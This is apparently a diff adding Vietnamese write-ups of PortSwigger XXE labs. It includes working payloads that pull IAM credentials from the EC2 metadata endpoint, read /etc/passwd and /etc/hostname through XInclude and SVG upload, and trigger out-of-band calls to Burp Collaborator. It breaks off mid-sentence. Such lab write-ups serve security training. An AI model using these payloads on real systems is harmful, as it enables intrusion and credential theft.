@@ -138,27 +138,158 @@ The lab server is running a (simulated) EC2 metadata endpoint at the default URL
 
 To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.
 ```
+Như bài lab đã mô tả cho chúng ta biết được rằng mạng nội bộ mà chúng ta cần là http://169.254.169.254/ và request chúng ta bắt được khi check stock vẫn là form XXE như cũ điều đó dẫn chúng ta đến payload như sau : 
+```
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
+```
+Tiếp theo chúng ta chuyển sang repeater để thử >
+
+
+
+"Invalid product ID:" Là phản hồi được trả về, kèm theo sau đó là 1 foldername, sau đó thêm folder name vào phía sau của URL mà chúng ta có được, cứ tiếp tục như thế cho đến khi chúng ta có được SecretAccessKey.
+
+
+```
+latest/meta-data/iam/security-credentials/admin
+```
+
+Sau đó chúng ta có được payload cuối cùng như sau
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
+```
+
+
+### Lab: Exploiting XInclude to retrieve files
+```
+This lab has a "Check stock" feature that embeds the user input inside a server-side XML document that is subsequently parsed.
+
+Because you don't control the entire XML document you can't define a DTD to launch a classic XXE attack.
+
+To solve the lab, inject an XInclude statement to retrieve the contents of the /etc/passwd file.
+```
+
+ chúng ta sử dụng XInclude để khai thác file /etc/passwd. Trước hết chúng ta cần biết về XInclude : Để thực hiện một cuộc tấn công XInclude,
+ bạn cần tham chiếu không gian tên XInclude và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. Ví dụ:
+```
+<foo xmlns: xi = "http://www.w3.org/2001/XInclude">
+
+<xi: include parse = "text" href = "file: /// etc / passwd" /> </foo>
+
+```
+
+Chúng ta truy cập bài lab và bắt request của check stock như sau 
+
+
+Nhận thấy rằng đã có sự thay đổi trong cách thử sử dụng XML, lab đã không sử dụng cấu trúc như cũ mà đã chọn cách nhúng dữ liệu vào DOCTYPE, 
+điều này khiến chúng ta không thể thực hiện 1 cuộc tấn công cổ điển vì không thể xác định được rõ ràng cấu trúc của XML. 
 
 
 
 
+Chúng ta có thể sử 
+dụng XInclude để khai thác file /etc/passwd. Trước hết chúng ta cần biết về XInclude : XInclude là một phần của đặc tả XML cho phép một tài 
+liệu XML được xây dựng từ các tài liệu con. Bạn có thể đặt một cuộc tấn công XInclude trong bất kỳ giá trị dữ liệu nào trong tài liệu XML, do
+đó, cuộc tấn công có thể được thực hiện trong các tình huống mà bạn chỉ kiểm soát một mục dữ liệu duy nhất được đặt vào tài liệu XML phía máy 
+chủ. Để thực hiện một cuộc tấn công XInclude, bạn cần tham chiếu không gian tên XInclude và cung cấp đường dẫn đến tệp mà bạn muốn đưa vào. 
+Ví dụ:
+```
+<foo xmlns: xi = "http://www.w3.org/2001/XInclude">
+
+<xi: include parse = "text" href = "file: /// etc / passwd" /> </foo>
+
+```
+Sau đó chúng ta truyền payload này vào 1 param của request cụ thể hơn lần này là ProductID.
+
+
+Và chúng ta đã leak được file passwd.
+
+### Lab: Exploiting XXE via image file upload
+```
+This lab lets users attach avatars to comments and uses the Apache Batik library to process avatar image files.
+
+To solve the lab, upload an image that displays the contents of the /etc/hostname file after processing. Then use the "Submit solution" button to submit the value of the server hostname.
+```
+
+Bài lab này mô tả khá chi tiết như sau, lồ hổng mà chúng ta cần khai thác lần này là phần comment của bài, trong phần đó cho đính kèm ảnh và bài yêu cầu chúng ta trả về file 
+/etc/hostname và click Submit solution để solve bài lab.
+
+Hint: ảnh dạng SVG sẽ có format XML :33 
+
+Điều này đã giúp chúng ta hình dung được cách thức tấn công, truy cập bài lab và chúng ta nhận được 1 blog như sau : 
+
+
+Chúng ta thấy phần cmt sẽ có phần thêm avatar , từ đó chúng ta có thể thêm bất kỳ ảnh nào. Như gọi ý thì SVG sẽ có format là XML nên chúng ta tạo 1 XML như sau và lưu dưới định 
+dạng svg.
+
+```
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
+version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
+```
+
+Payload này sẽ trả về giá trị của file /etc/hostname mà chúng ta cần. 
+
+
+Giá trị của ảnh trả về như sau 
+```
+94a8bb1f14c8
+```
+
+### Lab: Blind XXE with out-of-band interaction
+```
+This lab has a "Check stock" feature that parses XML input but does not display the result.
+
+You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.
+
+To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+```
+
+Mô tả nói rằng check stock vẫn sẽ là mục tiêu exploit của chúng ta tuy nhiên lần này lại là blind vulnerability và đề xuất chúng ta sử dụng out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) để khai thác.
+
+Truy cập bài lab chúng ta lại thấy web bán hàng và tìm tới chức năng check stock rồi bắt lại request.
+
+
+Tại đây chúng ta có thể thấy format của XML điều đó có nghĩa chúng ta có thể thực hiện 1 cuộc tấn công XXE cơ bản, tuy nhiên phải áp dụng out-of-band. Và Burp Collaboration sẽ cũng cấp cho chúng ta 1 client để nhận dữ liệu về. Từ đó có payload như sau :
 
 
 
 
+```
+<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>
+```
+
+
+### Lab: Blind XXE with out-of-band interaction via XML parameter entities
+
+```
+This lab has a "Check stock" feature that parses XML input, but does not display any unexpected values, and blocks requests containing regular external entities.
+
+To solve the lab, use a parameter entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
+```
+Đôi khi các cuộc tấn công external entity XXE thường bị chặn, do 1 số xác thực đầu vào của ứng dụng hoặc 
+1 số quá trình làm cứng trình phần tích cú pháp XML đang được sử dụng. Trong trường hợp này chúng ta có 
+thể sử dụng tham số XML để thay thế. Đầu tiên khai báo 1 thực thể tham số XML : 
+```
+<!ENTITY % myparameterentity "my parameter entity value" >
+```
+
+Sau đó tham chiếu thực thể như sau : 
+
+```
+<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://5flrcyoaljmclbaal1bjrgfj3a90xp.burpcollaborator.net"> %xxe; ]>
+```
 
 
 
+### Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+```
+This lab has a "Check stock" feature that parses XML input but does not display the result.
 
+To solve the lab, exfiltrate the contents of the /etc/hostname file.
+```
 
-
-
-
-
-
-
-
-
-
-
+Bài lab mô tả răng lỗ hổng này sẽ có phân tích input và sẽ không hiển thị kết quả
 
